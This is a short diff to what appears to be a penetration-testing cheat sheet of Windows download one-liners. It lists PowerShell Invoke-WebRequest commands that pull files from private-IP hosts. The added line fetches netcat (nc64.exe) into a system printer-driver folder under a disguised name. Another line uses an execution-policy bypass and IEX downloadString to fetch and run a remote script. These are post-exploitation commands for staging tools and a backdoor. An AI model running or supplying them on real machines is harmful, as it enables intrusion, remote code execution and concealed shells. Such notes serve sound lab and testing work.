@@ -5,7 +5,7 @@ IWR( )
 - powershell.exe -command iwr -Uri http://10.10.16.4/file -OutFile C:\Temp\file
 - powershell.exe iwr -uri 10.10.16.4/file -o C:\Temp\file
 - powershell iwr 10.10.16.4/file -o C:\Temp\file
-
+- powershell Invoke-WebRequest "http://10.50.102.157:800/nc64.exe" -OutFile "C:\Windows\System32\spool\drivers\color\\Pro-nc64.exe"
 - powershell.exe -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.200.101.200:20003/PST.ps1')"
 
 Certutil
